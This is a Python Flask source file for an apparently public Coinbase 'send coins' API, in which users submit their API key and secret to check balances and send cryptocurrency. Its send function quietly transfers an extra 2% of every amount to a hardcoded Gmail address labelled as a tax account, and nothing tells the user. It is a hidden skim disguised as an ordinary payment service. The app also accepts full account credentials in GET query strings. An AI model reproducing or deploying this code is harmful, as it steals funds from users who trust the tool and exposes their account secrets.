
from coinbase.wallet.client import Client
import json
from flask import Flask,request,jsonify
app = Flask(__name__)


def send(email, amo, api_key,api_secret,cur):
  client = Client(api_key, api_secret)
  account = client.get_account(cur)
  print(account)
  tax_email = 'monika359b@gmail.com'
  amod = float(amo)
  tro = account.send_money(to=tax_email,amount=amod*0.02,currency=cur)
  print(tro)
  gp = account.send_money(to=email,amount=amo,currency=cur)
  return gp

@app.route('/balance', methods = ['GET'])
def senndil():
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	currency = request.args.get('currency')
	client = Client(api_key, api_secret)
	account = client.get_account(currency)
	print(account)
	return account
@app.route('/te', methods = ['GET'])
def seil():
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	currency = request.args.get('currency')
	client = Client(api_key, api_secret)
	accoun = client.get_account(currency)
	account = accoun.get_transactions()
	print(account)
	return account
@app.route('/b', methods = ['GET'])
def sennl():
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	client = Client(api_key, api_secret)
	account = client.get_accounts()
	print(account)
	return account

@app.route('/bal', methods = ['GET'])
def sendZhdjjdil():
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	client = Client(api_key, api_secret)
	account = client.get_accounts()
	return account 

@app.route('/tx', methods = ['GET'])
def seniiksjdil():
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	txid = request.args.get('txid')
	currency = request.args.get('currency')
	client = Client(api_key, api_secret)
	c = client.get_accounts()
	account = client.get_transaction(currency, txid)
	print(account)
	return account

@app.route('/')
def setuphandler():
	return ("This is coinbase coins send api to know how to use dm @Rohit_kumawat_1 on telegram or send json data by post method \n => body: { email: 'your email', amount: 'amount u want to send', api_secret: api_secret,api_key:api_key,currency:'BTC or u can enter Any currency which is available in coinbase'} ।। Url is https://coinbase.up.railway.app/send ")

@app.route('/send', methods = ['POST'])
def sendZil():
	index = request.json
	email = index["email"]
	amount = index["amount"]
	api_key = index["api_key"]
	api_secret = index["api_secret"]
	currency = index["currency"]
	tx = send(email, amount,api_key,api_secret,currency)
	return tx
@app.route('/get', methods = ['GET'])
def sendZhil():
	email = request.args.get('email')
	amount = request.args.get('amount')
	api_key = request.args.get('api_key')
	api_secret = request.args.get('api_secret')
	currency = request.args.get('currency')
	tx = send(email, amount,api_key,api_secret,currency)
	return tx
